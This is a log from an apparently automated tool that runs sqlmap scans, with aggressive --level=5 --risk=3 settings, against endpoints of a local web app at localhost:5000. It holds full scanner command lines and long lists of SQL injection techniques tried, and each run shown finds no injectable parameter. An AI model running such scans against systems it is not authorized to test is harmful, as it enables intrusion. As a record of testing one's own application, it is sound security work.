2025-09-26 18:52:38,059 - INFO - [18:52:38] [INFO] flushing session file
2025-09-26 18:52:38,075 - INFO - [18:52:38] [INFO] testing connection to the target URL
2025-09-26 18:52:38,086 - INFO - [18:52:38] [CRITICAL] page not found (404)
2025-09-26 18:52:38,086 - INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
2025-09-26 18:52:38,086 - INFO - [18:52:38] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:38,086 - INFO - 404 (Not Found) - 1 times
2025-09-26 18:52:38,086 - INFO - 
2025-09-26 18:52:38,086 - INFO - [*] ending @ 18:52:38 /2025-09-26/
2025-09-26 18:52:38,096 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/users -H 'Content-Type: application/json' --data '{"email": "test"}'
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:35 /2025-09-26/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:52:38] [INFO] flushing session file
[18:52:38] [INFO] testing connection to the target URL
[18:52:38] [CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
[18:52:38] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times

[*] ending @ 18:52:38 /2025-09-26/

2025-09-26 18:52:38,212 - INFO - Flushed sqlmap session for http://localhost:5000/api/users (log: attack-logs-dynamic\Get_User_by_Email__API__flush.log)
2025-09-26 18:52:38,212 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/users --output-dir 'attack-logs-dynamic\Get_User_by_Email__API__sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"email": "test"}' --technique BU
2025-09-26 18:52:41,748 - INFO -         ___
2025-09-26 18:52:41,748 - INFO -        __H__
2025-09-26 18:52:41,748 - INFO -  ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:41,748 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:52:41,748 - INFO - |___|_  [)]_|_|_|__,|  _|
2025-09-26 18:52:41,748 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:41,764 - INFO - 
2025-09-26 18:52:41,781 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:41,788 - INFO - 
2025-09-26 18:52:41,788 - INFO - [*] starting @ 18:52:41 /2025-09-26/
2025-09-26 18:52:41,788 - INFO - 
2025-09-26 18:52:43,752 - INFO - [18:52:43] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_Email__API__sqlmap' as the output directory
2025-09-26 18:52:44,316 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 18:52:44,327 - INFO - [18:52:44] [INFO] testing connection to the target URL
2025-09-26 18:52:44,338 - INFO - [18:52:44] [CRITICAL] page not found (404)
2025-09-26 18:52:44,338 - INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
2025-09-26 18:52:44,338 - INFO - [18:52:44] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:44,338 - INFO - 404 (Not Found) - 1 times
2025-09-26 18:52:44,338 - INFO - 
2025-09-26 18:52:44,338 - INFO - [*] ending @ 18:52:44 /2025-09-26/
2025-09-26 18:52:44,338 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/users --output-dir 'attack-logs-dynamic\Get_User_by_Email__API__sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"email": "test"}' --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:41 /2025-09-26/

[18:52:43] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_Email__API__sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[18:52:44] [INFO] testing connection to the target URL
[18:52:44] [CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
[18:52:44] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times

[*] ending @ 18:52:44 /2025-09-26/

2025-09-26 18:52:44,348 - INFO - No clear injection detected during discovery for http://localhost:5000/api/users
2025-09-26 18:52:44,348 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/tools/dns-lookup
2025-09-26 18:52:48,018 - INFO -         ___
2025-09-26 18:52:48,018 - INFO -        __H__
2025-09-26 18:52:48,018 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:48,018 - INFO - |_ -| . [.]     | .'| . |
2025-09-26 18:52:48,018 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:52:48,018 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:48,018 - INFO - 
2025-09-26 18:52:48,050 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:48,050 - INFO - 
2025-09-26 18:52:48,050 - INFO - [*] starting @ 18:52:48 /2025-09-26/
2025-09-26 18:52:48,050 - INFO - 
2025-09-26 18:52:50,485 - INFO - [18:52:50] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:52:50,485 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:52:50,495 - INFO - [18:52:50] [INFO] testing connection to the target URL
2025-09-26 18:52:51,335 - INFO - [18:52:51] [INFO] testing if the target URL content is stable
2025-09-26 18:52:51,356 - INFO - [18:52:51] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
2025-09-26 18:52:51,356 - INFO - [18:52:51] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:52:51,372 - INFO - [18:52:51] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:52:51,399 - INFO - [18:52:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:52:51,420 - INFO - [18:52:51] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:52:51,478 - INFO - [18:52:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:52:51,594 - INFO - [18:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:52:51,619 - INFO - [18:52:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:52:51,665 - INFO - [18:52:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:52:51,717 - INFO - [18:52:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:52:51,759 - INFO - [18:52:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:52:51,809 - INFO - [18:52:51] [INFO] testing 'Generic inline queries'
2025-09-26 18:52:51,826 - INFO - [18:52:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:52:51,859 - INFO - [18:52:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:52:51,893 - INFO - [18:52:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:52:51,933 - INFO - [18:52:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:52:51,974 - INFO - [18:52:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:52:52,027 - INFO - [18:52:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:52:52,063 - INFO - [18:52:52] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:52:52,130 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:52:52,130 - INFO - [18:52:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:52:52,197 - INFO - [18:52:52] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:52:52,200 - INFO - [18:52:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:52:52,201 - INFO - [18:52:52] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:52,203 - INFO - 404 (Not Found) - 73 times
2025-09-26 18:52:52,203 - INFO - 
2025-09-26 18:52:52,204 - INFO - [*] ending @ 18:52:52 /2025-09-26/
2025-09-26 18:52:52,204 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/tools/dns-lookup
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:48 /2025-09-26/

[18:52:50] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:52:50] [INFO] testing connection to the target URL
[18:52:51] [INFO] testing if the target URL content is stable
[18:52:51] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[18:52:51] [INFO] testing if URI parameter '#1*' is dynamic
[18:52:51] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:52:51] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:52:51] [INFO] testing for SQL injection on URI parameter '#1*'
[18:52:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:52:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:52:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:52:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:52:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:52:51] [INFO] testing 'Generic inline queries'
[18:52:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:52:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:52:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:52:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:52:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:52:52] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:52:52] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:52:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:52:52] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:52:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:52:52] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 73 times

[*] ending @ 18:52:52 /2025-09-26/

2025-09-26 18:52:52,219 - INFO - Flushed sqlmap session for http://localhost:5000/tools/dns-lookup (log: attack-logs-dynamic\DNS_Lookup_flush.log)
2025-09-26 18:52:52,228 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/tools/dns-lookup?host=test' --output-dir 'attack-logs-dynamic\DNS_Lookup_sqlmap' --batch --level=5 --risk=3 --threads 5 -p host --technique BU
2025-09-26 18:52:56,155 - INFO -         ___
2025-09-26 18:52:56,155 - INFO -        __H__
2025-09-26 18:52:56,155 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:52:56,155 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:52:56,155 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:52:56,155 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:52:56,155 - INFO - 
2025-09-26 18:52:56,171 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:52:56,171 - INFO - 
2025-09-26 18:52:56,186 - INFO - [*] starting @ 18:52:56 /2025-09-26/
2025-09-26 18:52:56,187 - INFO - 
2025-09-26 18:52:58,195 - INFO - [18:52:58] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\DNS_Lookup_sqlmap' as the output directory
2025-09-26 18:52:58,808 - INFO - [18:52:58] [INFO] testing connection to the target URL
2025-09-26 18:52:58,901 - INFO - [18:52:58] [INFO] testing if the target URL content is stable
2025-09-26 18:52:59,340 - INFO - [18:52:59] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
2025-09-26 18:52:59,369 - INFO - [18:52:59] [WARNING] heuristic (basic) test shows that GET parameter 'host' might not be injectable
2025-09-26 18:52:59,379 - INFO - [18:52:59] [INFO] testing for SQL injection on GET parameter 'host'
2025-09-26 18:52:59,426 - INFO - [18:52:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:52:59,979 - INFO - [18:52:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:00,690 - INFO - [18:53:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:53:01,172 - INFO - [18:53:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:01,579 - INFO - [18:53:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:02,025 - INFO - [18:53:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:02,112 - INFO - [18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:02,272 - INFO - [18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:53:02,373 - INFO - [18:53:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:02,565 - INFO - [18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:02,956 - INFO - [18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:53:03,163 - INFO - [18:53:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:03,416 - INFO - [18:53:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:03,828 - INFO - [18:53:03] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:53:04,202 - INFO - [18:53:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:53:04,557 - INFO - [18:53:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:53:05,250 - INFO - [18:53:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:53:05,650 - INFO - [18:53:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:53:06,347 - INFO - [18:53:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:53:06,725 - INFO - [18:53:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:53:07,365 - INFO - [18:53:07] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:53:07,769 - INFO - [18:53:07] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:53:08,448 - INFO - [18:53:08] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:53:08,816 - INFO - [18:53:08] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:53:09,461 - INFO - [18:53:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:53:09,853 - INFO - [18:53:09] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:53:10,543 - INFO - [18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,557 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:53:10,569 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:53:10,577 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:53:10,597 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:53:10,614 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:53:10,620 - INFO - [18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:53:10,629 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:53:10,640 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,661 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:53:10,675 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:53:10,684 - INFO - [18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:53:10,688 - INFO - [18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,716 - INFO - [18:53:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:53:10,735 - INFO - [18:53:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,744 - INFO - [18:53:10] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:53:10,765 - INFO - [18:53:10] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,782 - INFO - [18:53:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:53:10,796 - INFO - [18:53:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:10,805 - INFO - [18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:53:10,821 - INFO - [18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:53:10,832 - INFO - [18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:53:10,850 - INFO - [18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:53:10,861 - INFO - [18:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:10,882 - INFO - [18:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:10,901 - INFO - [18:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:10,904 - INFO - [18:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:10,907 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:10,920 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:10,954 - INFO - [18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:53:10,979 - INFO - [18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:53:11,003 - INFO - [18:53:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:11,014 - INFO - [18:53:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:11,039 - INFO - [18:53:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:11,064 - INFO - [18:53:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:11,082 - INFO - [18:53:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:11,101 - INFO - [18:53:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:11,124 - INFO - [18:53:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:11,145 - INFO - [18:53:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:53:11,166 - INFO - [18:53:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:11,193 - INFO - [18:53:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:53:11,540 - INFO - [18:53:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:53:11,786 - INFO - [18:53:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:53:11,812 - INFO - [18:53:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:53:12,074 - INFO - [18:53:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:53:12,330 - INFO - [18:53:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:53:12,698 - INFO - [18:53:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:53:12,965 - INFO - [18:53:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:53:13,244 - INFO - [18:53:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:53:13,485 - INFO - [18:53:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:53:13,760 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:53:13,760 - INFO - [18:53:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:53:14,461 - INFO - [18:53:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:53:15,210 - INFO - [18:53:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:53:15,973 - INFO - [18:53:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:53:16,690 - INFO - [18:53:16] [WARNING] GET parameter 'host' does not seem to be injectable
2025-09-26 18:53:16,700 - INFO - [18:53:16] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 18:53:16,712 - INFO - [18:53:16] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 18:53:16,715 - INFO - [18:53:16] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 18:53:16,731 - INFO - [18:53:16] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 18:53:16,794 - INFO - [18:53:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:17,351 - INFO - [18:53:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:18,044 - INFO - [18:53:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:53:18,472 - INFO - [18:53:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:18,812 - INFO - [18:53:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:53:19,240 - INFO - [18:53:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:19,342 - INFO - [18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:53:19,541 - INFO - [18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:53:19,650 - INFO - [18:53:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:19,838 - INFO - [18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:53:20,266 - INFO - [18:53:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:53:20,479 - INFO - [18:53:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:20,665 - INFO - [18:53:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:53:20,998 - INFO - [18:53:20] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:53:21,319 - INFO - [18:53:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:53:21,699 - INFO - [18:53:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:53:22,511 - INFO - [18:53:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
